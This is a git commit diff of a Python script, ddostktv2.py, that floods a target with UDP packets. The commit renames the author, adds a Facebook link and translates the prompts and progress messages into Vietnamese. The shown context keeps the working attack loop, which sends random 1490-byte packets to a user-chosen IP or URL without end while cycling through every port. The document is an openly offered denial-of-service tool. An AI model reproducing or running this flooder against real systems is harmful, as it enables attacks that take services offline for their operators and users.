b6da58da02fb22d9dd3f4ea502adc4aff2070a96
k90hgm <54022191+k90hgm@users.noreply.github.com>
2019-11-17 10:25:42 +0700

    Update ddostktv2.py

--- ddostktv2.py
+++ ddostktv2.py
@@ -18,34 +18,34 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet Ddos TKT ( VIET NAM")
 print
-print "Author   : Stephin-Franklin"
-print "You Tube : https://www.youtube.com/AnonymousTim3"
-print "github   : https://github.com/Stephin-Franklin"
-print "Facebook : https://www.facebook.com/st1chb45h"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+print "TÁC GIẢ:   : THỎ KHÔNG TRẮNG"
+
+
+print "Facebook : https://www.facebook.com/syaoran582"
+print " TẦN SUẤT: BẠN CÓ THỂ CHỌN SỐ NGẪU NHIÊN ( MẶC ĐỊNH THƯỜNG LÀ 80)"
+ip = raw_input("IP ( hoặc url web ) : ")
+port = input("Tần suất   : ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+os.system("figlet ĐANG TẤN CÔNG")
 print "[                    ] 0% "
 time.sleep(5)
-print "[=====               ] 25%"
+print "[===== ĐÃ ĐƯỢC               ] 25%"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[========== ĐÃ ĐƯỢC         ] 50%"
 time.sleep(5)
-print "[===============     ] 75%"
+print "[=============== ĐÃ ĐƯỢC    ] 75%"
 time.sleep(5)
-print "[====================] 100%"
+print "[==================== HOÀN THÀNH] 100%"
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print "đã gửi  %s dữ liệu tấn công  %s vào:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
 
